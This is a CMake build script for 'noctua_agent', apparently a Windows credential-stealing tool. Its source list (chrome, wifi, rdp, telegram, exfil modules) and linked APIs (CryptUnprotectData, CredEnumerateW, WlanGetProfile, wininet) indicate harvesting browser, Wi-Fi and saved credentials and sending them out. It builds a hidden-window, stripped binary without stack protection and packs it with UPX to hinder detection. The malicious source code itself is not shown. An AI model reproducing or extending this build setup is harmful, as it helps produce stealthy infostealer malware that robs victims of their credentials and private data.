cmake_minimum_required(VERSION 3.10)
project(noctua_agent CXX)

# Cross-compile for Windows x64 via MinGW
set(CMAKE_SYSTEM_NAME Windows)
set(CMAKE_SYSTEM_PROCESSOR x86_64)

# Specify the cross-compiler
set(CMAKE_CXX_COMPILER x86_64-w64-mingw32-g++)
set(CMAKE_C_COMPILER x86_64-w64-mingw32-gcc)
set(CMAKE_RC_COMPILER x86_64-w64-mingw32-windres)

# Compiler flags
set(CMAKE_CXX_FLAGS "${CMAKE_CXX_FLAGS} -Os -s -fvisibility=hidden -fno-stack-protector -fomit-frame-pointer -ffunction-sections -fdata-sections -Wl,--gc-sections")
set(CMAKE_CXX_FLAGS "${CMAKE_CXX_FLAGS} -mwindows -D_UNICODE -DUNICODE -DWIN32_LEAN_AND_MEAN")

# GUI subsystem (no console window)
set(CMAKE_EXE_LINKER_FLAGS "${CMAKE_EXE_LINKER_FLAGS} -mwindows -Wl,--subsystem,windows")

# Source files
set(SOURCES
    src/main.cpp
    src/chrome.cpp
    src/wifi.cpp
    src/rdp.cpp
    src/telegram.cpp
    src/exfil.cpp
)

# Include directories
include_directories(src)

# Create executable
add_executable(noctua_agent WIN32 ${SOURCES})

# Link required Windows libraries
target_link_libraries(noctua_agent
    crypt32      # CryptUnprotectData, CryptStringToBinary
    secur32      # SSPI / security functions
    wininet      # InternetOpen, HttpOpenRequest, etc.
    ws2_32       # Winsock2 for DNS
    ole32        # COM initialization
    credui       # CredEnumerateW
    wlanapi      # WlanOpenHandle, WlanEnumInterfaces, WlanGetProfile
    shlwapi      # Path functions
    shell32      # ShellExecuteEx
)

# Set output name
set_target_properties(noctua_agent PROPERTIES
    OUTPUT_NAME "noctua_agent"
    SUFFIX ".exe"
)

# Add a custom target to upx compress (if upx available)
find_program(UPX_EXECUTABLE upx)
if(UPX_EXECUTABLE)
    add_custom_command(TARGET noctua_agent POST_BUILD
        COMMAND ${UPX_EXECUTABLE} --best --ultra-brute $<TARGET_FILE:noctua_agent>
        COMMENT "Compressing with UPX..."
    )
endif()

message(STATUS "NOCTUA Agent - Cross-compiling for Windows x64")
message(STATUS "Output: noctua_agent.exe")
